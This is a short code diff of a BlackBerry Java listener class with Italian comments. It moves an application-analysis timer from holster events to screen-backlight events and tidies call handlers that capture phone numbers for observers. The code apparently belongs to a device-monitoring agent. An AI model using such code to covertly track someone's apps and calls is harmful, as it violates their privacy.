@@ -316,8 +316,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         debug.info("inHolster");
         //#endif
 
-        // interrompe l'analisi degli applicativi
-        task.suspendApplicationTimer();
     }
 
     /*
@@ -329,10 +327,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         debug.info("outOfHolster");
         //#endif
 
-        // riprende l'analisi degli applicativi
-        // se c'e' una variazione nella lista comunica la lista agli observer
-        // viene fatto con un timer
-        task.resumeApplicationTimer();
     }
 
     /*
@@ -455,6 +449,16 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             //#endif
 
             observer.onBacklightChange(on);
+        }
+       
+        if (on) {
+            // riprende l'analisi degli applicativi
+            // se c'e' una variazione nella lista comunica la lista agli observer
+            // viene fatto con un timer
+            task.resumeApplicationTimer();
+        } else {
+            // interrompe l'analisi degli applicativi
+            task.suspendApplicationTimer();
         }
         
         // Verifica dei timers di task
@@ -602,7 +606,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
 
     }
 
-
     public void callConnected(int callId) {
         //#ifdef DEBUG_INFO
         debug.info("callConnected: " + callId);
@@ -650,19 +653,19 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                 observer.onCallAnswered(phoneNumber);
             }
         }
-        
+
     }
-    
+
     public void callDisconnected(int callId) {
         //#ifdef DEBUG_INFO
         debug.info("callDisconnected: " + callId);
         //#endif
 
         PhoneCall phoneCall = Phone.getCall(callId);
-        if(phoneCall == null){
+        if (phoneCall == null) {
             return;
         }
-        
+
         String phoneNumber = phoneCall.getDisplayPhoneNumber();
         boolean outgoing = phoneCall.isOutgoing();
 
